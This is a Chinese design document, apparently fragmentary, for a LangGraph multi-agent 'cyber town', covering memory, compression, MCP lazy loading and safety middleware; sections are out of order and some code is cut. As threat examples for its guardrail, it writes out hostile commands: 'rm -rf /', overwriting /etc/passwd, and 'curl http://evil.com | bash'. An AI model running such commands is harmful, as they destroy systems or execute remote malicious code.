## 一、项目概述

### 1.1 目标

基于 LangGraph 框架重构赛博小镇多智能体系统，实现以下核心能力：

| 能力 | 描述 |
|------|------|
| 多角色 Agent | 不同职业的 Agent 扮演不同角色，拥有独立人格和技能 |
| 双层记忆 | 短期记忆（会话级）+ 长期记忆（向量数据库持久化） |
| 对话压缩 | 滑动窗口机制，超过 5 轮自动压缩总结 |
| 技能系统 | 每个职业对应独立 Skill，沉淀专业技能 |
| MCP 懒加载 | Skill 内声明 MCP 依赖，按需加载 |
| 五级情感系统 | Agent 间关系情感随对话动态升降，影响对话风格 |
| 中间件防护体系 | 七层防护中间件，保障系统安全稳定运行 |

### 4.2 短期记忆 — 滑动窗口 + 对话压缩

**核心机制：**

```python
# memory/short_term_memory.py

WINDOW_SIZE = 5  # 滑动窗口大小: 保留最近5轮对话
# 1轮 = 1次用户消息 + 1次Agent回复


class ShortTermMemory:
    """短期记忆管理器 — 基于 LangGraph State"""

    def __init__(self, window_size: int = WINDOW_SIZE):
        self.window_size = window_size
        self.all_messages: list[BaseMessage] = []  # 完整对话记录
        self.summary: str = ""  # 历史对话摘要
        self.compressed_rounds: int = 0  # 已压缩的轮数

    def add_message(self, message: BaseMessage):
        """添加新消息到记忆窗口"""
        self.all_messages.append(message)

    def get_turn_count(self) -> int:
        """计算当前对话轮数 (用户消息数)"""
        return sum(1 for m in self.all_messages if m.type == "human")

    def should_compress(self) -> bool:
        """判断是否需要压缩"""
        current_turns = self.get_turn_count()
        return (current_turns - self.compressed_rounds) >= self.window_size

    def get_context(self) -> list[BaseMessage]:
        """
        获取送给 LLM 的上下文:
        1. 历史摘要 (如果有)
        2. 最近 window_size 轮的原始消息
        """
        context = []

        # 添加历史摘要作为系统消息
        if self.summary:
            context.append(SystemMessage(
                content=f"[历史对话摘要]\n{self.summary}"
            ))

        # 获取最近 N 轮的原始消息
        recent_messages = self._get_recent_n_rounds(self.window_size)
        context.extend(recent_messages)

        return context
```

**对话压缩节点（LangGraph Node）：**

```python
# graph/nodes/conversation_compress_node.py

async def compress_conversation(state: AgentState) -> dict:
    """
    对话压缩节点:
    当对话超过5轮时，将旧对话压缩为摘要
    """
    compressor = ConversationCompressor(llm=ChatOpenAI(model="gpt-4o-mini"))

    # 1. 获取需要压缩的消息（排除最近5轮）
    all_messages = state["messages"]
    keep_recent = 5 * 2  # 5轮 = 10条消息 (5 user + 5 assistant)
    messages_to_compress = all_messages[:-keep_recent]

    if not messages_to_compress:
        return {}

    # 2. LLM 压缩为摘要
    new_summary = await compressor.compress(
        existing_summary=state.get("conversation_summary", ""),
        messages=messages_to_compress
    )

    # 3. 更新状态: 用摘要替换旧消息
    # 保留摘要 + 最近5轮原始消息
    recent_messages = all_messages[-keep_recent:]

    summary_message = SystemMessage(
        content=f"[之前对话的压缩摘要]\n{new_summary}"
    )

    return {
        "messages": [summary_message] + recent_messages,
        "conversation_summary": new_summary,
        "turn_count": state["turn_count"],  # 不变
    }
```

### 4.3 长期记忆 — 向量数据库

```python
# memory/long_term_memory.py

import chromadb
from chromadb.config import Settings
from datetime import datetime


class LongTermMemory:
    """长期记忆管理器 — 基于向量数据库"""

    def __init__(self, persist_dir: str = "./data/chroma_db"):
        self.client = chromadb.Client(Settings(
            persist_directory=persist_dir,
            anonymized_telemetry=False
        ))

    def save_memory(
        self,
        agent_id: str,
        content: str,
        importance: float = 0.5,
        emotion: str = "neutral",
        metadata: dict = None
    ):
        """
        保存一条长期记忆

        Args:
            agent_id: Agent ID
            content: 记忆内容
            importance: 重要性评分 (0-1)
            emotion: 情感标签
            metadata: 额外元数据 (地点、相关人员等)
        """
        collection = self._get_collection(agent_id)

        collection.upsert(
            documents=[content],
            metadatas=[{
                "importance": importance,
                "emotion": emotion,
                "timestamp": datetime.now().isoformat(),
                **(metadata or {})
            }],
            ids=[f"mem_{datetime.now().timestamp()}"]
        )

    def recall(
        self,
        agent_id: str,
        query: str,
        n_results: int = 5,
        importance_threshold: float = 0.3
    ) -> list[dict]:
        """
        语义检索长期记忆

        检索策略: 语义相似度 + 时间衰减 + 重要性权重
        """
        collection = self._get_collection(agent_id)

        results = collection.query(
            query_texts=[query],
            n_results=n_results * 2,  # 多取一些用于过滤
            where={
                "importance": {"$gte": importance_threshold}
            }
        )

        # 综合排序: 语义相似度 × 重要性 × 时间衰减
        scored_memories = []
        for i, doc in enumerate(results["documents"][0]):
            meta = results["metadatas"][0][i]
            distance = results["distances"][0][i]

            # 时间衰减因子 (越近的记忆权重越高)
            hours_ago = (datetime.now() - datetime.fromisoformat(
                meta["timestamp"]
            )).total_seconds() / 3600
            time_decay = 1.0 / (1.0 + 0.01 * hours_ago)

            # 综合分数
            score = (1 - distance) * meta["importance"] * time_decay

            scored_memories.append({
                "content": doc,
                "importance": meta["importance"],
                "emotion": meta.get("emotion"),
                "timestamp": meta["timestamp"],
                "score": score
            })

        # 按综合分数排序，返回 Top-K
        scored_memories.sort(key=lambda x: x["score"], reverse=True)
        return scored_memories[:n_results]

    def _get_collection(self, agent_id: str):
        """获取或创建 Agent 的记忆集合"""
        return self.client.get_or_create_collection(
            name=f"agent_{agent_id}_memories",
            metadata={"hnsw:space": "cosine"}
        )
```

```python
        self,
        agent_id: str,
        user_message: str,
        agent_response: str,
        context: dict = None
    ):
        """保存一次交互记录"""
        # 1. 短期记忆: 直接追加 (由 LangGraph State 管理)

        # 2. 判断是否值得写入长期记忆
        importance = await self._evaluate_importance(
            user_message, agent_response
        )

        if importance > 0.6:  # 重要性阈值
            self.ltm.save_memory(
                agent_id=agent_id,
                content=f"对话: {user_message}\n回复: {agent_response}",
                importance=importance,
                metadata=context
            )

    async def _evaluate_importance(self, user_msg: str, agent_msg: str) -> float:
        """
        用 LLM 评估记忆重要性 (0-1)

        判断标准:
        - 包含个人信息、偏好、关键决策 → 高
        - 包含事实知识、经验教训 → 中高
        - 普通寒暄 → 低
        """
        prompt = f"""评估以下对话的重要性 (0-1):

用户: {user_msg}
Agent: {agent_msg}

评估维度:
- 是否包含关键个人信息或偏好
- 是否包含重要决策或承诺
- 是否包含有价值的知识或经验
- 是否对后续对话有参考价值

只输出一个 0-1 之间的数字:"""

        response = await self.llm.ainvoke(prompt)
        try:
            return float(response.content.strip())
        except ValueError:
            return 0.5  # 默认中等重要性
```

### 5.3 修复悬空工具调用 (DanglingToolCallMiddleware)

#### 5.3.1 问题场景

**什么是悬空工具调用?**
用户中断对话时，可能导致 AI 的工具调用缺少对应的 ToolMessage，造成状态不一致。

**问题示例：**
```python
# 正常流程
[AIMessage] 我来读取文件 → tool_calls=[{"name": "read_file"}]
[ToolMessage] 文件内容: ...  # 工具执行结果

# 用户中断(悬空)
[AIMessage] 我来读取文件 → tool_calls=[{"name": "read_file"}]
# 用户中断,工具未执行,缺少 ToolMessage ❌

# 下次对话会出错:
# AI 认为已经调用了工具,但找不到结果
```

#### 5.3.2 解决方案

**自动补全缺失的 ToolMessage：**
```python
# 检测悬空调用
if last_msg.type == "ai" and last_msg.tool_calls:
    # 有工具调用但没有对应的工具结果
    # 自动补全错误消息
    tool_message = ToolMessage(
        content="Tool execution was interrupted",
        status="error"
    )
```

#### 5.3.3 技术实现

**核心逻辑：**
```python
# middleware/dangling_tool_call.py

from langchain_core.messages import ToolMessage, AIMessage

class DanglingToolCallMiddleware:
    """修复悬空工具调用中间件"""
    
    def __init__(self):
        self.name = "dangling_tool_call"
    
    async def process(self, state: dict) -> dict:
        """
        处理悬空工具调用
        
        检测最后一条消息是否是AI消息且有工具调用，
        但没有对应的工具结果，自动补全错误消息
        """
        messages = state.get("messages", [])
        if not messages:
            return state
        
        last_msg = messages[-1]
        
        # 检查是否是 AI 消息且有工具调用
        if isinstance(last_msg, AIMessage) and last_msg.tool_calls:
            # 检查是否有对应的工具结果
            has_results = self._check_tool_results(messages)
            
            if not has_results:
                # 补全缺失的工具消息
                tool_messages = self._add_dangling_tool_messages(last_msg)
                return {"messages": messages + tool_messages}
        
        return state
    
    def _check_tool_results(self, messages: list) -> bool:
        """检查是否有对应的工具结果"""
        last_msg = messages[-1]
        if not last_msg.tool_calls:
            return True
        
        # 检查每个工具调用是否有结果
        for tool_call in last_msg.tool_calls:
            tool_id = tool_call.get("id")
            # 查找对应的ToolMessage
            has_result = any(
                isinstance(msg, ToolMessage) and 
                msg.tool_call_id == tool_id
                for msg in messages
            )
            if not has_result:
                return False
        
        return True
    
    def _add_dangling_tool_messages(self, ai_message: AIMessage) -> list:
        """为悬空的工具调用添加错误消息"""
        tool_messages = []
        
        for tool_call in ai_message.tool_calls:
            tool_id = tool_call.get("id")
            tool_name = tool_call.get("name")
            
            tool_messages.append(ToolMessage(
                content=f"Tool '{tool_name}' execution was interrupted",
                tool_call_id=tool_id,
                status="error"
            ))
        
        return tool_messages
```

无需配置，自动运行。

#### 5.3.5 最佳实践

- ✅ 必须在其他中间件之前执行
- ✅ 修复后再进行其他处理
- ✅ 记录日志方便调试
- ✅ 不影响正常流程

### 5.4 安全策略检查 (GuardrailMiddleware)

#### 5.4.1 问题场景

**安全风险：**
AI 可以执行各种工具，包括危险操作：
- `bash("rm -rf /")` - 删除系统文件
- `write_file("/etc/passwd", ...)` - 修改系统配置
- `bash("curl http://evil.com | bash")` - 执行恶意脚本

#### 5.4.2 解决方案

**工具调用前安全检查：**
```
AI: 调用 bash("rm -rf /")
    ↓
GuardrailMiddleware: 拦截!检查策略
    ↓
AllowlistProvider: bash 在黑名单 → DENIED ❌
    ↓
返回错误: "Guardrail denied: tool 'bash' is denied"
    ↓
AI: 看到错误,选择其他方法
```

#### 5.4.3 技术实现

**核心逻辑：**
```python
# middleware/guardrail.py

from dataclasses import dataclass
from typing import Optional, List

@dataclass
class GuardrailDecision:
    """安全决策结果"""
    allow: bool
    reasons: List[str] = None
    
    def __post_init__(self):
        if self.reasons is None:
            self.reasons = []

class GuardrailMiddleware:
    """安全策略检查中间件"""
    
    def __init__(self, config: dict):
        self.enabled = config.get("enabled", True)
        self.fail_closed = config.get("fail_closed", True)
        self.provider = self._init_provider(config.get("provider", {}))
    
    def _init_provider(self, provider_config: dict) -> "GuardrailProvider":
        """初始化安全策略提供者"""
        provider_type = provider_config.get("use", "allowlist")
        
        if provider_type == "allowlist":
            return AllowlistProvider(provider_config.get("config", {}))
        elif provider_type == "oap":
            return OAPGuardrailProvider(provider_config)
        else:
            raise ValueError(f"Unknown provider type: {provider_type}")
    
    async def process(self, state: dict) -> dict:
        """
        处理工具调用的安全检查
        
        检查每个工具调用是否符合安全策略，
        不符合的调用将被阻止并返回错误消息
        """
        if not self.enabled:
            return state
        
        messages = state.get("messages", [])
        if not messages:
            return state
        
        last_msg = messages[-1]
        
        # 检查是否有工具调用
        if not hasattr(last_msg, 'tool_calls') or not last_msg.tool_calls:
            return state
        
        # 检查每个工具调用
        denied_calls = []
        for tool_call in last_msg.tool_calls:
            tool_name = tool_call.get("name")
            tool_input = tool_call.get("args", {})
            
            try:
                decision = self.provider.evaluate(
                    tool_name=tool_name,
                    tool_input=tool_input
                )
                
                if not decision.allow:
                    denied_calls.append({
                        "tool_call": tool_call,
                        "reasons": decision.reasons
                    })
            except Exception as e:
                if self.fail_closed:
                    # 安全优先，拒绝所有调用
                    denied_calls.append({
                        "tool_call": tool_call,
                        "reasons": [f"Guardrail provider error: {str(e)}"]
                    })
        
        # 如果有被拒绝的调用，返回错误消息
        if denied_calls:
            error_messages = self._create_error_messages(denied_calls)
            return {"messages": messages + error_messages}
        
        return state
    
    def _create_error_messages(self, denied_calls: list) -> list:
        """创建错误消息"""
        from langchain_core.messages import ToolMessage
        
        messages = []
        for denied in denied_calls:
            tool_call = denied["tool_call"]
            reasons = denied["reasons"]
            
            messages.append(ToolMessage(
                content=f"Guardrail denied: {', '.join(reasons)}",
                tool_call_id=tool_call.get("id"),
                status="error"
            ))
        
        return messages


class AllowlistProvider:
    """白名单/黑名单提供者"""
    
    def __init__(self, config: dict):
        self.denied_tools = set(config.get("denied_tools", []))
        self.allowed_tools = set(config.get("allowed_tools", []))
    
    def evaluate(self, tool_name: str, tool_input: dict) -> GuardrailDecision:
        """评估工具调用是否允许"""
        # 如果有白名单，检查是否在白名单中
        if self.allowed_tools:
            if tool_name not in self.allowed_tools:
                return GuardrailDecision(
                    allow=False,
                    reasons=[f"Tool '{tool_name}' is not in allowed list"]
                )
        
        # 如果有黑名单，检查是否在黑名单中
        if self.denied_tools:
            if tool_name in self.denied_tools:
                return GuardrailDecision(
                    allow=False,
                    reasons=[f"Tool '{tool_name}' is denied"]
                )
        
        return GuardrailDecision(allow=True)
```

### 5.5 上下文压缩 (SummarizationMiddleware)

#### 5.5.1 问题场景

**Token 限制：**
- GPT-4: 8K tokens
- Claude: 200K tokens
- 长对话会超出限制，导致对话中断

#### 5.5.2 解决方案

**自动压缩历史消息：**
```
原始对话 (4500 tokens):
[用户] 你好
[AI] 你好!
[用户] 帮我研究 AI 历史
[AI] 好的...
... (20 条消息)
[用户] 总结一下
[AI] 好的...

压缩后 (1500 tokens):
[摘要] 用户询问 AI 发展历史,我进行了详细研究...
[用户] 总结一下
[AI] 好的...
```

#### 5.5.3 技术实现

**核心逻辑：**
```python
# middleware/summarization.py

from langchain_openai import ChatOpenAI

class SummarizationMiddleware:
    """上下文压缩中间件"""
    
    def __init__(self, config: dict):
        self.enabled = config.get("enabled", True)
        self.model_name = config.get("model_name", "gpt-4o-mini")
        self.trigger = config.get("trigger", [
            {"type": "tokens", "value": 6000},
            {"type": "messages", "value": 50}
        ])
        self.keep = config.get("keep", {"type": "messages", "value": 20})
        self.trim_tokens = config.get("trim_tokens_to_summarize", 4000)
        
        self.llm = ChatOpenAI(model=self.model_name)
    
    async def process(self, state: dict) -> dict:
        """
        处理上下文压缩
        
        当对话达到触发条件时，将旧对话压缩为摘要
        """
        if not self.enabled:
            return state
        
        messages = state.get("messages", [])
        if not messages:
            return state
        
        # 检查是否需要压缩
        if not self._should_compress(messages):
            return state
        
        # 执行压缩
        new_messages = await self._compress_messages(messages)
        
        return {"messages": new_messages}
    
    def _should_compress(self, messages: list) -> bool:
        """判断是否需要压缩"""
        # 检查消息数量
        for trigger in self.trigger:
            if trigger["type"] == "messages":
                if len(messages) >= trigger["value"]:
                    return True
        
        # 检查Token数量（简化实现）
        for trigger in self.trigger:
            if trigger["type"] == "tokens":
                # 这里简化处理，实际应该计算token数量
                if len(messages) * 100 >= trigger["value"]:
                    return True
        
        return False
    
    async def _compress_messages(self, messages: list) -> list:
        """压缩消息"""
        # 确定要保留的消息数
        keep_count = self.keep.get("value", 20)
        messages_to_compress = messages[:-keep_count]
        recent_messages = messages[-keep_count:]
        
        if not messages_to_compress:
            return messages
        
        # 调用LLM生成摘要
        summary = await self._generate_summary(messages_to_compress)
        
        # 用摘要替换旧消息
        from langchain_core.messages import SystemMessage
        
        summary_message = SystemMessage(
            content=f"[历史对话摘要]\n{summary}"
        )
        
        return [summary_message] + recent_messages
    
    async def _generate_summary(self, messages: list) -> str:
        """生成摘要"""
        # 构建摘要提示词
        prompt = self._build_summary_prompt(messages)
        
        # 调用LLM
        response = await self.llm.ainvoke(prompt)
        
        return response.content
    
    def _build_summary_prompt(self, messages: list) -> str:
        """构建摘要提示词"""
        prompt = """你是一个对话摘要助手。请将以下对话历史压缩为简洁的摘要。

压缩规则:
1. 保留关键信息: 人物、事件、决定、重要观点
2. 保留情感基调
3. 保留未完成的话题或待办事项
4. 删除寒暄、重复内容、不重要细节
5. 使用第三人称描述
6. 摘要长度控制在原文的 20%-30%

对话历史:
"""
        
        for msg in messages:
            role = msg.type
            content = msg.content
            prompt += f"\n[{role}]: {content}\n"
        
        return prompt
```

### 5.6 截断子代理调用 (SubagentLimitMiddleware)

#### 5.6.1 问题场景

**资源耗尽风险：**
AI 可能同时启动过多子代理：
```
AI: 同时启动 10 个研究任务!
    [task("研究1"), task("研究2"), ..., task("研究10")]

结果:
- Token: 22K (超出限制)
- 内存: 50 MB (可能 OOM)
- 网络: 50 次请求 (拥堵)
- 系统崩溃 💥
```

#### 5.6.2 解决方案

**强制截断超限调用：**
```
AI: [task("研究1"), task("研究2"), task("研究3"),
     task("研究4"), task("研究5")]

中间件: 检测到 5 个 task,超过限制(3)
        截断为: [task("研究1"), task("研究2"), task("研究3")]

结果: 只启动 3 个子代理,资源可控 ✅
```

#### 5.6.3 技术实现

**核心逻辑：**
```python
# middleware/subagent_limit.py

class SubagentLimitMiddleware:
    """截断子代理调用中间件"""
    
    def __init__(self, config: dict):
        self.max_concurrent = config.get("max_concurrent", 3)
        self.subagent_tools = config.get("subagent_tools", ["task", "create_agent"])
    
    async def process(self, state: dict) -> dict:
        """
        处理子代理调用限制
        
        检测并截断超过限制的子代理调用
        """
        messages = state.get("messages", [])
        if not messages:
            return state
        
        last_msg = messages[-1]
        
        # 检查是否有子代理工具调用
        if not hasattr(last_msg, 'tool_calls') or not last_msg.tool_calls:
            return state
        
        # 统计子代理调用数量
        subagent_calls = [
            tc for tc in last_msg.tool_calls
            if tc.get("name") in self.subagent_tools
        ]
        
        # 如果超过限制，截断
        if len(subagent_calls) > self.max_concurrent:
            truncated_calls = subagent_calls[:self.max_concurrent]
            other_calls = [
                tc for tc in last_msg.tool_calls
                if tc.get("name") not in self.subagent_tools
            ]
            
            # 更新消息的工具调用列表
            last_msg.tool_calls = other_calls + truncated_calls
            
            # 添加警告消息
            from langchain_core.messages import SystemMessage
            warning_msg = SystemMessage(
                content=f"[警告] 检测到 {len(subagent_calls)} 个子代理调用，"
                       f"已截断为 {self.max_concurrent} 个以防止资源耗尽"
            )
            
            return {"messages": messages + [warning_msg]}
        
        return state
```

#### 5.6.4 配置参数

```python

    max_concurrent=3  # 最大并发子代理数 (2-4)
)
```

#### 5.6.5 资源消耗分析

| 并发数 | Token | 内存 | 风险 |
|--------|-------|------|------|

```python
import logging
from langchain_core.messages import ToolMessage

class ToolErrorHandlingMiddleware:
    """异常处理中间件"""
    
    def __init__(self, config: dict = None):
        self.enabled = True
        self.logger = logging.getLogger(__name__)
    
    async def process(self, state: dict) -> dict:
        """
        处理工具执行异常
        
        捕获工具执行过程中的异常，转换为可读的错误消息
        """
        messages = state.get("messages", [])
        if not messages:
            return state
        
        # 检查是否有工具执行错误
        # 这里简化处理，实际应该在工具执行时捕获异常
        # 并将异常信息存储在state中
        
        return state
    
    def handle_tool_error(self, tool_name: str, error: Exception) -> ToolMessage:
        """处理工具错误"""
        self.logger.exception(f"Tool {tool_name} failed")
        
        # 根据异常类型返回不同的错误消息
        error_type = type(error).__name__
        
        if error_type == "PermissionError":
            message = f"权限不足: 无法执行 '{tool_name}'"
        elif error_type == "FileNotFoundError":
            message = f"文件不存在: {str(error)}"
        elif error_type == "TimeoutError":
            message = f"执行超时: '{tool_name}' 耗时过长"
        elif error_type == "NetworkError":
            message = f"网络错误: 无法连接到服务"
        elif error_type == "ValueError":
            message = f"参数错误: {str(error)}"
        else:
            message = f"执行 '{tool_name}' 时发生错误: {str(error)}"
        
        return ToolMessage(
            content=message,
            status="error"
        )
```

### 5.8 检测循环 (LoopDetectionMiddleware)

#### 5.8.1 问题场景

**无限循环风险：**
AI 可能陷入重复调用的死循环：
```
AI: [read_file("config.txt")]
Tool: "文件内容: ..."
AI: [read_file("config.txt")]  ← 重复!
Tool: "文件内容: ..."
AI: [read_file("config.txt")]  ← 又重复!
... 无限循环 ...
系统: 达到 recursion_limit → 对话崩溃 💥
```

#### 5.8.2 解决方案

**两级保护机制：**
```
第 3 次重复: ⚠️ 警告
  注入警告消息: "[LOOP DETECTED] You are repeating..."
  AI 看到警告,自我纠正 ✅

第 5 次重复: 🛑 强制停止
  移除工具调用: tool_calls=[]
  AI 必须输出文本回复 ✅
```

#### 5.8.3 技术实现

**核心逻辑：**
```python
# middleware/loop_detection.py

from collections import defaultdict
from typing import Dict, List
from langchain_core.messages import SystemMessage

class LoopDetectionMiddleware:
    """检测循环中间件"""
    
    def __init__(self, config: dict):
        self.warn_threshold = config.get("warn_threshold", 3)
        self.hard_limit = config.get("hard_limit", 5)
        self.window_size = config.get("window_size", 20)
        self.max_tracked_threads = config.get("max_tracked_threads", 100)
        
        # 追踪工具调用历史
        self.call_history: Dict[str, List[dict]] = defaultdict(list)
    
    async def process(self, state: dict) -> dict:
        """
        处理循环检测
        
        检测重复的工具调用，防止死循环
        """
        messages = state.get("messages", [])
        if not messages:
            return state
        
        last_msg = messages[-1]
        
        # 检查是否有工具调用
        if not hasattr(last_msg, 'tool_calls') or not last_msg.tool_calls:
            return state
        
        # 检查每个工具调用
        for tool_call in last_msg.tool_calls:
            tool_name = tool_call.get("name")
            tool_input = tool_call.get("args", {})
            
            # 记录调用
            call_signature = self._get_call_signature(tool_name, tool_input)
            self.call_history[call_signature].append({
                "timestamp": time.time(),
                "message_index": len(messages) - 1
            })
            
            # 限制历史大小
            if len(self.call_history[call_signature]) > self.window_size:
                self.call_history[call_signature].pop(0)
            
            # 检查重复次数
            call_count = len(self.call_history[call_signature])
            
            if call_count >= self.hard_limit:
                # 强制停止
                last_msg.tool_calls = [
                    tc for tc in last_msg.tool_calls
                    if tc != tool_call
                ]
                
                warning_msg = SystemMessage(
                    content=f"[循环检测] 检测到工具 '{tool_name}' 重复调用 {call_count} 次，"
                           f"已强制停止。请尝试其他方法。"
                )
                
                return {"messages": messages + [warning_msg]}
            
            elif call_count >= self.warn_threshold:
                # 发出警告
                warning_msg = SystemMessage(
                    content=f"[循环警告] 检测到工具 '{tool_name}' 重复调用 {call_count} 次，"
                           f"请考虑其他方法。"
                )
                
                return {"messages": messages + [warning_msg]}
        
        return state
    
    def _get_call_signature(self, tool_name: str, tool_input: dict) -> str:
        """获取工具调用签名"""
        # 简化处理，只考虑工具名
        # 实际应该考虑参数的相似性
        return tool_name
```

### 5.9 澄清拦截 (ClarificationMiddleware)

#### 5.9.1 问题场景

**AI 请求澄清：**
```
用户: "帮我分析一下"

    调用 ask_clarification("你想分析什么?")

问题:

- 但系统继续执行
- 状态不一致
```

#### 5.9.2 解决方案

**拦截澄清请求，中断到 END：**

```python
    return Command(goto=END)
```

#### 5.9.3 技术实现

**核心逻辑：**
```python
# middleware/clarification.py

from langchain_core.messages import SystemMessage

class ClarificationMiddleware:
    """澄清拦截中间件"""
    
    def __init__(self, config: dict = None):
        self.enabled = True
        self.clarification_tools = config.get("clarification_tools", [
            "ask_clarification",
            "request_clarification",
            "clarify_input"
        ])
    
    async def process(self, state: dict) -> dict:
        """
        处理澄清请求拦截
        
        检测澄清请求工具调用，拦截并中断到END
        """
        messages = state.get("messages", [])
        if not messages:
            return state
        
        last_msg = messages[-1]
        
        # 检查是否有澄清工具调用
        if not hasattr(last_msg, 'tool_calls') or not last_msg.tool_calls:
            return state
        
        # 检查是否有澄清工具
        clarification_calls = [
            tc for tc in last_msg.tool_calls
            if tc.get("name") in self.clarification_tools
        ]
        
        if clarification_calls:
            # 提取澄清问题
            clarifications = []
            for call in clarification_calls:
                args = call.get("args", {})
                question = args.get("question", args.get("text", ""))
                if question:
                    clarifications.append(question)
            
            # 移除澄清工具调用
            last_msg.tool_calls = [
                tc for tc in last_msg.tool_calls
                if tc.get("name") not in self.clarification_tools
            ]
            
            # 添加澄清问题作为系统消息
            if clarifications:
                clarification_msg = SystemMessage(
                    content=f"[需要澄清]\n{chr(10).join(clarifications)}"
                )
                
                return {
                    "messages": messages + [clarification_msg],
                    "should_end": True  # 标记应该结束
                }
        
        return state
```

### 5.10 中间件链管理

#### 5.10.1 中间件链实现

```python
# middleware/middleware_chain.py

from typing import List

class MiddlewareChain:
    """中间件链管理器"""
    
    def __init__(self, middlewares: List):
        self.middlewares = middlewares
    
    async def process(self, state: dict) -> dict:
        """
        按顺序执行所有中间件
        
        Args:
            state: 当前状态
            
        Returns:
            处理后的状态
        """
        current_state = state
        
        for middleware in self.middlewares:
            try:
                current_state = await middleware.process(current_state)
            except Exception as e:
                # 中间件执行失败，记录日志但继续执行
                import logging
                logger = logging.getLogger(__name__)
                logger.error(f"Middleware {middleware.name} failed: {e}")
        
        return current_state
```

### 5.2 Skill 基类定义

```python
# skills/base_skill.py

from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class MCPDependency:
    """MCP 依赖声明"""
    server_name: str           # MCP Server 名称
    server_config_path: str    # 配置文件路径
    required_tools: list[str]  # 需要用到的工具列表
    description: str           # 描述为什么需要这个MCP


@dataclass
class SkillManifest:
    """技能清单 (声明式配置)"""
    name: str
    description: str
    version: str = "1.0.0"

    # 触发条件
    trigger_keywords: list[str] = field(default_factory=list)
    trigger_intent: str = ""  # LLM 意图匹配描述

    # MCP 依赖 (关键: 声明何时需要加载)
    mcp_dependencies: list[MCPDependency] = field(default_factory=list)

    # 技能增强提示词
    system_prompt_enhancement: str = ""

    # 执行优先级 (数字越小越优先)
    priority: int = 10


class BaseSkill(ABC):
    """技能基类"""

    def __init__(self, manifest: SkillManifest):
        self.manifest = manifest

    @abstractmethod
    async def execute(self, context: dict) -> str:
        """执行技能，返回结果"""
        ...

    def get_prompt_enhancement(self) -> str:
        """获取技能对系统提示词的增强内容"""
        return self.manifest.system_prompt_enhancement

    def get_mcp_requirements(self) -> list[MCPDependency]:
        """获取 MCP 依赖列表"""
        return self.manifest.mcp_dependencies

    def should_trigger(self, user_input: str, detected_intent: str = "") -> bool:
        """判断是否应该触发此技能"""
        # 关键词匹配
        keyword_match = any(
            kw in user_input for kw in self.manifest.trigger_keywords
        )

        # 意图匹配 (由 LLM 在 skill_match 节点判断)
        intent_match = (
            detected_intent
            and self.manifest.trigger_intent
            and self.manifest.trigger_intent in detected_intent
        )

        return keyword_match or intent_match
```

```python
        # 已加载的 MCP Server 实例
        # {server_name: {"client": mcp_client, "tools": [tool_instances]}}
        self._loaded_servers: dict[str, dict] = {}

        # MCP 配置缓存
        self._server_configs: dict[str, dict] = {}

    def register_server_config(self, server_name: str, config: dict):
        """注册 MCP Server 配置 (启动时预注册)"""
        self._server_configs[server_name] = config

    def is_loaded(self, server_name: str) -> bool:
        """检查 MCP Server 是否已加载"""
        return server_name in self._loaded_servers

    async def load_server(
        self,
        server_name: str,
        required_tools: list[str] = None
    ) -> list:
        """
        按需加载 MCP Server

        Args:
            server_name: Server 名称
            required_tools: 只加载指定工具 (None=全部加载)

        Returns:
            可用的 LangChain Tool 列表
        """
        if self.is_loaded(server_name):
            server = self._loaded_servers[server_name]
            tools = server["tools"]
            if required_tools:
                tools = [t for t in tools if t.name in required_tools]
            return tools

        config = self._server_configs.get(server_name)
        if not config:
            raise ValueError(f"MCP Server '{server_name}' 未注册配置")

        # 1. 启动 MCP Server 进程
        client = await self._start_mcp_server(config)

        # 2. 发现可用工具
        all_tools = await client.list_tools()

        # 3. 过滤需要的工具
        if required_tools:
            all_tools = [
                t for t in all_tools if t.name in required_tools
            ]

        # 4. 转换为 LangChain Tool
        lc_tools = [
            self._mcp_tool_to_langchain(client, tool)
            for tool in all_tools
        ]

        # 5. 缓存
        self._loaded_servers[server_name] = {
            "client": client,
            "tools": lc_tools,
            "config": config
        }

        print(f"[MCPLoader] 已加载: {server_name} "
              f"({len(lc_tools)} 个工具: "
              f"{[t.name for t in lc_tools]})")

        return lc_tools

    async def _start_mcp_server(self, config: dict):
        """启动 MCP Server 子进程"""
        from mcp import ClientSession, StdioServerParameters
        from mcp.client.stdio import stdio_client

        server_params = StdioServerParameters(
            command=config["command"],
            args=config.get("args", []),
            env=config.get("env", {})
        )

        stdio_transport = await stdio_client(server_params).__aenter__()
        read_stream, write_stream = stdio_transport

        session = ClientSession(read_stream, write_stream)
        await session.__aenter__()
        await session.initialize()

        return session

    def _mcp_tool_to_langchain(self, client, mcp_tool) -> "BaseTool":
        """将 MCP Tool 转换为 LangChain Tool"""
        from langchain_core.tools import StructuredTool
        import json

        async def tool_func(**kwargs) -> str:
            result = await client.call_tool(
                mcp_tool.name, arguments=kwargs
            )
            return result.content[0].text

        # 构建 Pydantic 参数模型
        parameters = mcp_tool.inputSchema
        properties = parameters.get("properties", {})
        required = parameters.get("required", [])

        return StructuredTool.from_function(
            coroutine=tool_func,
            name=mcp_tool.name,
            description=mcp_tool.description,
            args_schema=self._build_args_schema(properties, required)
        )

    def _build_args_schema(self, properties: dict, required: list):
        """动态构建参数 Schema"""
        from pydantic import BaseModel, Field

        fields = {}
        for prop_name, prop_info in properties.items():
            field_type = self._json_type_to_python(prop_info.get("type", "string"))
            fields[prop_name] = (
                field_type,
                Field(
                    description=prop_info.get("description", ""),
                    default=... if prop_name in required else None
                )
            )

        return type("DynamicArgs", (BaseModel,), fields)

    async def unload_server(self, server_name: str):
        """卸载 MCP Server (释放资源)"""
        if server_name in self._loaded_servers:
            client = self._loaded_servers[server_name]["client"]
            await client.__aexit__(None, None, None)
            del self._loaded_servers[server_name]
            print(f"[MCPLoader] 已卸载: {server_name}")

    async def load_skill_mcps(
        self,
        skill: "BaseSkill",
        loaded_mcps_state: list[str]
    ) -> list:
        """
        加载 Skill 声明的所有 MCP 依赖

        自动跳过已加载的 Server，实现增量加载
        """
        all_tools = []

        for dep in skill.get_mcp_requirements():
            if dep.server_name not in loaded_mcps_state:
                tools = await self.load_server(
                    dep.server_name,
                    dep.required_tools
                )
                loaded_mcps_state.append(dep.server_name)
                all_tools.extend(tools)
            else:
                # 已加载，直接复用
                server = self._loaded_servers[dep.server_name]
                tools = server["tools"]
                if dep.required_tools:
                    tools = [t for t in tools if t.name in dep.required_tools]
                all_tools.extend(tools)

        return all_tools
```

### 10.1 小镇编排图

```python
# graph/town_graph.py

from langgraph.graph import StateGraph, START, END
from graph.nodes.dispatch_node import dispatch_node
from agents.base_agent import BaseAgent


def create_town_graph(agents: list[BaseAgent]) -> StateGraph:
